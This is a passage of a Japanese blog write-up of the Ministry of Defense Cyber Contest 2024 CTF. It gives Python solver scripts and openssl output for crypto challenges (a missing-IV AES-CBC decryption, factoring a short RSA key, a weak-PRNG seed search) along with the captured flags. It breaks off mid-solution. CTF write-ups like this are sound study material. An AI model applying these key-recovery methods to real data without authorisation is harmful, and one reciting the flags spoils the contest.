<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>防衛省サイバーコンテスト 2024 - Writeup | 俺とお前とlaysakura</title>
  
  <link rel="canonical" href="https://laysakura.github.io/2024/02/26/vlc-cybercontest-2024/"/>
  <meta name="viewport" content="width=device-width">
  <meta name="description" content="防衛省サイバーコンテスト 2024に参加し、450人中7位の成績を収めました ✌️ 感想とwriteupを書きます。">
<meta property="og:type" content="article">
<meta property="og:title" content="防衛省サイバーコンテスト 2024 - Writeup">
<meta property="og:url" content="https://laysakura.github.io/2024/02/26/vlc-cybercontest-2024/index.html">
<meta property="og:site_name" content="俺とお前とlaysakura">
<meta property="og:description" content="防衛省サイバーコンテスト 2024に参加し、450人中7位の成績を収めました ✌️ 感想とwriteupを書きます。">
<meta property="og:locale" content="ja_JP">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%201.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%202.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%203.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%204.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%205.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%206.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%207.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%208.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%209.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2010.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2011.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2012.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2013.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2014.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2015.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2016.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2017.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2018.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2019.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2020.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2021.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2022.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2023.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2024.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2025.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2026.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2027.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2028.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2029.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2030.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2031.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2032.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2033.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2034.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2035.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2036.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2037.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2038.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2039.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2040.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2041.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2042.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2043.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2044.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2045.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2046.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2047.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2048.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2049.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2050.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2051.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2052.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2053.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2054.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2055.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2056.png">
<meta property="og:image" content="https://laysakura.github.io/img/2024/02-25/Untitled%2057.png">
<meta property="article:published_time" content="2024-02-25T16:11:57.000Z">
<meta property="article:modified_time" content="2024-02-25T21:38:51.318Z">
<meta property="article:author" content="Sho Nakatani a.k.a. laysakura">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="セキュリティ">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://laysakura.github.io/img/2024/02-25/Untitled.png">

  <!-- favicon -->
  <link rel="apple-touch-icon" sizes="180x180" href="/favicon/apple-touch-icon.png">
  <link rel="icon" href="/favicon/favicon.ico">
  <link rel="icon" type="image/png" sizes="32x32" href="/favicon/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/favicon/favicon-16x16.png">
  <link rel="manifest" href="/favicon/site.webmanifest">
  <link rel="mask-icon" href="/favicon/safari-pinned-tab.svg" color="#5bbad5">
  <meta name="msapplication-TileColor" content="#da532c">
  <meta name="theme-color" content="#ffffff">

  

  
<link rel="stylesheet" href="/css/style.css">

  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  
<script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-22289437-2']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
</script>


  <!-- MathJax -->
  <script type="text/javascript" id="MathJax-script" async
    src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
  </script

<meta name="generator" content="Hexo 6.1.0"></head>

<body>
  <div id="container">
    <div class="mobile-nav-panel">
	<i class="icon-reorder icon-large"></i>
</div>
<header id="header">
	<h1 class="blog-title">
		<a href="/">俺とお前とlaysakura</a>
	</h1>
	<nav class="nav">
		<ul>
			<li><a href="/archives">過去の投稿</a></li>
			<li><a id="nav-search-btn" class="nav-icon" title="Search"></a></li>
			<li><a target="_blank" rel="noopener" href="http://cloud.feedly.com/#subscription%2Ffeed%2Fhttps%3A%2F%2Flaysakura.github.io%2Fatom.xml" id="nav-rss-link" class="nav-icon" title="RSS Feed"></a></li>
		</ul>
	</nav>
	<div id="search-form-wrap">
		<form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://laysakura.github.io"></form>
	</div>
</header>
    <div id="main">
      <article id="post-防衛省サイバーコンテスト2024-Writeup" class="post">
  <footer class="entry-meta-header">
    <span class="meta-elements date">
      <a href="/2024/02/26/vlc-cybercontest-2024/" class="article-date">
  <time datetime="2024-02-25T16:11:57.000Z" itemprop="datePublished">2024-02-26</time>
</a>
    </span>
  </footer>
  
  <header class="entry-header">
    
  
    <h1 class="article-title entry-title" itemprop="name">
      防衛省サイバーコンテスト 2024 - Writeup
    </h1>
  

  </header>
  <div class="entry-content">
    
    <img src="/img/2024/02-25/Untitled.png" width="auto" height="auto">

<p>防衛省サイバーコンテスト 2024に参加し、450人中<strong>7位</strong>の成績を収めました ✌️</p>
<p>感想とwriteupを書きます。</p>
<span id="more"></span>

<h2><span id="目次">目次</span></h2><!-- toc -->

<ul>
<li><a href="#%E9%A0%86%E4%BD%8D%E8%A7%A3%E3%81%91%E3%81%9F%E5%95%8F%E9%A1%8C">順位・解けた問題</a></li>
<li><a href="#%E6%84%9F%E6%83%B3">感想</a></li>
<li><a href="#welcome">Welcome</a></li>
<li><a href="#crypto">Crypto</a><ul>
<li><a href="#information-of-certificate">Information of Certificate</a></li>
<li><a href="#missing-iv">Missing IV</a></li>
<li><a href="#short-rsa-public-key">Short RSA Public Key</a></li>
<li><a href="#cryptographically-insecure-prng">Cryptographically Insecure PRNG</a></li>
</ul>
</li>
<li><a href="#forensics">Forensics</a><ul>
<li><a href="#ntfs-data-hide">NTFS Data Hide</a></li>
<li><a href="#ntfs-file-delete">NTFS File Delete</a></li>
<li><a href="#ntfs-file-rename">NTFS File Rename</a></li>
<li><a href="#hidden-variable">HiddEN Variable</a></li>
<li><a href="#my-secret">My Secret</a></li>
</ul>
</li>
<li><a href="#miscellaneous">Miscellaneous</a><ul>
<li><a href="#une-maison">Une Maison</a></li>
<li><a href="#string-obfuscation">String Obfuscation</a></li>
<li><a href="#where-is-the-legit-flag">Where Is the Legit Flag?</a></li>
<li><a href="#utter-darkness">Utter Darkness</a></li>
<li><a href="#serial-port-signal-%E8%A7%A3%E3%81%91%E3%81%AA%E3%81%8B%E3%81%A3%E3%81%9F">Serial Port Signal (解けなかった 😭)</a></li>
</ul>
</li>
<li><a href="#network-nw">Network (NW)</a><ul>
<li><a href="#discovery">Discovery</a></li>
<li><a href="#exploit">Exploit</a></li>
<li><a href="#pivot">Pivot</a></li>
<li><a href="#fileextract">FileExtract</a></li>
<li><a href="#do-the-best-%E8%A7%A3%E3%81%91%E3%81%AA%E3%81%8B%E3%81%A3%E3%81%9F">Do tHe best (解けなかった 😭)</a></li>
</ul>
</li>
<li><a href="#programming">Programming</a><ul>
<li><a href="#logistic-map">Logistic Map</a></li>
<li><a href="#randomness-extraction">Randomness Extraction</a></li>
<li><a href="#xml-confectioner">XML Confectioner</a></li>
<li><a href="#twisted-text">Twisted Text</a></li>
</ul>
</li>
<li><a href="#trivia">Trivia</a><ul>
<li><a href="#the-original-name-of-aes">The Original Name of AES</a></li>
<li><a href="#cve-record-of-lowest-number">CVE Record of Lowest Number</a></li>
<li><a href="#mfa-factors">MFA Factors</a></li>
</ul>
</li>
<li><a href="#web">Web</a><ul>
<li><a href="#browsers-have-local-storage">Browsers Have Local Storage</a></li>
<li><a href="#are-you-introspective">Are You Introspective?</a></li>
<li><a href="#insecure">Insecure</a></li>
<li><a href="#variation-%E8%A7%A3%E3%81%91%E3%81%AA%E3%81%8B%E3%81%A3%E3%81%9F">Variation (解けなかった 😭)</a></li>
<li><a href="#bruteforce">Bruteforce</a></li>
</ul>
</li>
</ul>
<!-- tocstop -->

<h2><span id="順位解けた問題">順位・解けた問題</span></h2><img src="/img/2024/02-25/Untitled%201.png" width="auto" height="auto">

<img src="/img/2024/02-25/Untitled%202.png" width="auto" height="auto">

<h2><span id="感想">感想</span></h2><p>今回のコンテストはよくあるCTFとは違い、</p>
<ul>
<li>network問題でOSCP, Boot2Root的な問題が出る</li>
<li>pwnがない</li>
</ul>
<p>という特徴があり、両方とも自分には有利に働いてこの結果だったと思います。</p>
<p>今の実力で解けるべき問題は解き切ったかな（DO_tHe_bestは頑張れた気もする）という思いです。</p>
<p>PivotとBruteforceが面白かったのと、Missing IVとShort RSA Public Keyは教育的で良いなと思いました。</p>
<h2><span id="welcome">Welcome</span></h2><img src="/img/2024/02-25/Untitled%203.png" width="550px" height="auto">

<p>添付にフラグがそのまま書いてある。</p>
<aside>
⛳ flag{WelcomeToMODCyberContest!}

</aside>

<h2><span id="crypto">Crypto</span></h2><h3><span id="information-of-certificate">Information of Certificate</span></h3><img src="/img/2024/02-25/Untitled%204.png" width="550px" height="auto">

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">% openssl x509 -<span class="keyword">in</span> Easy.crt -text -noout</span><br><span class="line">Certificate:</span><br><span class="line">    Data:</span><br><span class="line">        Version: 1 (0x0)</span><br><span class="line">        Serial Number: 2024 (0x7e8)</span><br><span class="line">    Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">        Issuer: C=XX, ST=Some-State, L=Nowhere, O=Invalid, OU=Invalid, CN=**QRK7rNJ3hShV.vlc-cybercontest.invalid**/emailAddress=user@QRK7rNJ3hShV.vlc-cybercontest.invalid</span><br><span class="line">        Validity</span><br><span class="line">            Not Before: Jan  1 00:00:00 2024 GMT</span><br><span class="line">            Not After : Feb  1 00:00:00 2024 GMT</span><br><span class="line">        Subject: C=XX, ST=Some-State, L=Nowhere</span><br><span class="line">        Subject Public Key Info:</span><br><span class="line">            Public Key Algorithm: rsaEncryption</span><br><span class="line">                RSA Public-Key: (512 bit)</span><br><span class="line">                Modulus:</span><br><span class="line">                    00:a6:61:cf:52:55:0a:e4:5e:9b:5c:99:3b:aa:20:</span><br><span class="line">                    90:0d:80:06:9a:9b:be:23:4c:17:0d:2c:<span class="built_in">fc</span>:d1:be:</span><br><span class="line">                    66:43:40:7f:55:10:6a:99:56:0c:b2:09:a5:a2:6d:</span><br><span class="line">                    2a:25:c4:ff:67:e4:e3:02:87:57:cf:77:af:67:04:</span><br><span class="line">                    31:c5:f7:9b:83</span><br><span class="line">                Exponent: 65537 (0x10001)</span><br><span class="line">    Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">         3c:ff:d8:42:a8:eb:2c:55:93:5c:73:a3:84:fa:ea:9b:f8:fb:</span><br><span class="line">         f2:06:50:e4:95:97:9f:5e:ad:c7:ac:b6:36:77:4b:66:1f:38:</span><br><span class="line">         20:bf:71:9d:83:32:c1:3c:35:4f:b9:98:b4:4c:97:87:53:7d:</span><br><span class="line">         84:80:83:<span class="built_in">df</span>:ab:10:cc:fa:88:b1</span><br></pre></td></tr></table></figure>

<p>で出てきたCNがフラグ。</p>
<aside>
⛳ flag{QRK7rNJ3hShV.vlc-cybercontest.invalid}

</aside>

<h3><span id="missing-iv">Missing IV</span></h3><img src="/img/2024/02-25/Untitled%205.png" width="550px" height="auto">

<p>AES-CBCの復号の問題。AES-CBCは以下の構造で暗号化している。</p>
<img src="/img/2024/02-25/Untitled%206.png" width="auto" height="auto">

<p><a target="_blank" rel="noopener" href="https://aes.cryptohack.org/ecbcbcwtf/">https://aes.cryptohack.org/ecbcbcwtf/</a> より引用</p>
<ul>
<li>鍵: 128 bit (今回は既知)</li>
<li>平文: 128 bitごとに分割 (未知)</li>
<li>暗号文: 128 bitごとに分割 (既知)</li>
</ul>
<p>という状況。</p>
<p>今回は幸い鍵がわかっているので、後ろのブロックから順に復号してやれば良い（現在の復号済みブロックを前の暗号ブロックとXORする関係で後ろから処理）。</p>
<p>一番最初のブロックだけはIVがわからないので復号できないが、たぶん最初のブロックに大事な情報は入ってないと高を括る。</p>
<p>以下のプログラムを書いた。復号結果を zip にしているのは、最初に目で見たら <code>PK</code> のzipファイルのマジックコードが先頭に見えたから。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">key = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;4285a7a182c286b5aa39609176d99c13&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;NoIV.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    encrypted_flag = f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 暗号文をブロック分割</span></span><br><span class="line">enc_blocks = [encrypted_flag[i : i + <span class="number">16</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(encrypted_flag), <span class="number">16</span>)]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;enc_blocks: <span class="subst">&#123;<span class="built_in">len</span>(enc_blocks)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_block</span>(<span class="params">block_bytes</span>):</span><br><span class="line">    <span class="comment"># 暗号文を復号</span></span><br><span class="line">    cipher =  AES.new(key, AES.MODE_ECB)</span><br><span class="line">    decrypted = cipher.decrypt(block_bytes)</span><br><span class="line">    <span class="keyword">return</span> decrypted</span><br><span class="line"></span><br><span class="line">decrypted = <span class="built_in">bytes</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 暗号文のブロックを逆順に復号</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc_blocks) - <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">    <span class="comment"># ブロック単体の復号</span></span><br><span class="line">    dec_ecb_block = decrypt_block(enc_blocks[i])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 復号結果は、前のブロックとXORされている。再度XORをとることで復号</span></span><br><span class="line">    prev_enc_block = enc_blocks[i - <span class="number">1</span>]</span><br><span class="line">    dec_cbc_block = [blk ^ prev_blk <span class="keyword">for</span> blk, prev_blk <span class="keyword">in</span> <span class="built_in">zip</span>(dec_ecb_block, prev_enc_block)]</span><br><span class="line">    <span class="comment">#print(f&quot;decrypted block #&#123;i&#125;: &#123;&#x27;&#x27;.join([chr(c) for c in dec_cbc_block])&#125;&quot;)</span></span><br><span class="line"></span><br><span class="line">    decrypted = <span class="built_in">bytes</span>(dec_cbc_block) + decrypted</span><br><span class="line"></span><br><span class="line"><span class="comment"># 最初のブロックはIVがわからないので復号できない</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;dec.zip&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(decrypted)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;decrypted data written to dec.zip&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>実行すると、 dec.zip ができる。unzipすると色々ファイルが出てくる。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">% ag flag</span><br><span class="line">content.xml</span><br><span class="line"><span class="number">2</span>:...&lt;text:p text:style-name=<span class="string">&quot;P1&quot;</span>&gt;**flag&#123;ESYQV0fPMxz4wMmU&#125;**&lt;/text:p&gt;&lt;/office:text&gt;&lt;/office:body&gt;&lt;/office:document-content&gt;</span><br></pre></td></tr></table></figure>

<p>ということで、</p>
<aside>
⛳ flag{ESYQV0fPMxz4wMmU}

</aside>

<h3><span id="short-rsa-public-key">Short RSA Public Key</span></h3><img src="/img/2024/02-25/Untitled%207.png" width="550px" height="auto">

<p>RSAの問題の解法は自分メモとして <a target="_blank" rel="noopener" href="https://laysakura.notion.site/CTF-crypto-829de7f32c02413396ecc3c79b1d0ddf#6b13caf305e0411ca28a3e0fa57168c2">RSA - Notion</a> にまとめてある。</p>
<p>まずは添付の .pem を雑に↓に投げる。</p>
<p><a target="_blank" rel="noopener" href="https://8gwifi.org/PemParserFunctions.jsp">Online Certificate Decoder, decode crl,crt,csr,pem,privatekey,publickey,rsa,dsa,rasa publickey,ec</a></p>
<img src="/img/2024/02-25/Untitled%208.png" width="auto" height="auto">

<p>public exponentは <code>e</code> modulus の部分が公開鍵 <code>n</code> 。10進数にすると:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">% python -c <span class="string">&#x27;print(0xad81c92641c0b18c4eda551c1d7828044e3e4a7519aac90ee4691c4a86dce2e1)&#x27;</span></span><br><span class="line">**<span class="number">78479434358679743508116090024686132395246871443799969871485501232049475609313</span>**</span><br></pre></td></tr></table></figure>

<p>公開鍵が短いので、素因数分解も簡単。↓に投げる。</p>
<img src="/img/2024/02-25/Untitled%209.png" width="auto" height="auto">

<p>素因数分解もできたので、あとはコードを書く。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">n = <span class="number">78479434358679743508116090024686132395246871443799969871485501232049475609313</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;RSA-cipher.dat&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> myfile:</span><br><span class="line">    c = bytes_to_long(myfile.read())</span><br><span class="line"></span><br><span class="line">p = <span class="number">1011146650909449935800449563521726151</span></span><br><span class="line">q = <span class="number">77614294907759846691928156982114516291863</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> n == p * q</span><br><span class="line"></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>

<p>実行すると</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">% python solve.py</span><br><span class="line"><span class="string">b&#x27;\x02\xb0\xf9\x92\x16M\x1fN\x0f\xcd\xd5Bl\x00**flag&#123;X0Myx6IHI8&#125;**\n&#x27;</span></span><br></pre></td></tr></table></figure>

<aside>
⛳ flag{X0Myx6IHI8}

</aside>

<h3><span id="cryptographically-insecure-prng">Cryptographically Insecure PRNG</span></h3><img src="/img/2024/02-25/Untitled%2010.png" width="550px" height="auto">

<p>XORに使う鍵は、4バイトのシードさえ決まれば一意に定まる。ただし任意4バイトはブルートフォースするには多すぎるので、絞り込みたい。</p>
<p>最初の4文字が英字であることが期待されるので、そのような条件を満たすようなシードをリストアップすることとする。以下の <code>seedlist.py</code> （試行錯誤ゆえめちゃ汚い）を実行すると、 <code>seedlist.hex</code> のファイルにシード候補たちが1行ずつ書かれる。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mk_seed</span>(<span class="params">ciphertext, ascii4</span>):</span><br><span class="line">    ascii4_long = bytes_to_long(<span class="built_in">bytes</span>(ascii4, <span class="string">&quot;ascii&quot;</span>))</span><br><span class="line"></span><br><span class="line">    seed_bytes = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        seed_bytes = <span class="built_in">bytes</span>([ciphertext[j] ^ ((ascii4_long &gt;&gt; ((<span class="number">3</span> - j) * <span class="number">8</span>)) &amp; <span class="number">0xFF</span>)]) + seed_bytes</span><br><span class="line">    <span class="keyword">return</span> seed_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># Read the encrypted file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;PRNG.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ciphertext = f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># アルファベットのリストを作成</span></span><br><span class="line">alphabet = [<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>), <span class="built_in">ord</span>(<span class="string">&quot;z&quot;</span>) + <span class="number">1</span>)] + [</span><br><span class="line">    <span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&quot;A&quot;</span>), <span class="built_in">ord</span>(<span class="string">&quot;Z&quot;</span>) + <span class="number">1</span>)</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4文字の組み合わせを生成</span></span><br><span class="line">combinations = itertools.product(alphabet, repeat=<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;seedlist.hex&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ループで組み合わせを処理</span></span><br><span class="line">    <span class="keyword">for</span> combo <span class="keyword">in</span> combinations:</span><br><span class="line">        <span class="comment"># 文字列に変換して出力</span></span><br><span class="line">        ascii4 = <span class="string">&quot;&quot;</span>.join(combo)</span><br><span class="line">        seed = mk_seed(ciphertext, ascii4)</span><br><span class="line">        seed_hex = <span class="built_in">bytes</span>.<span class="built_in">hex</span>(seed)</span><br><span class="line">        <span class="built_in">print</span>(ascii4, seed_hex)</span><br><span class="line">        f.write(<span class="string">f&quot;<span class="subst">&#123;seed_hex&#125;</span>\n&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>このシードを使って復号を試みる。復号結果には <code>flag</code> の文字列が含まれているはずなので、復号結果にそれが含まれていたら <code>decrypted-seed-&#123;その時のseed&#125;.txt</code> に復号結果全文が書き込まれるようなスクリプトを書いた（これまた汚い…）。</p>
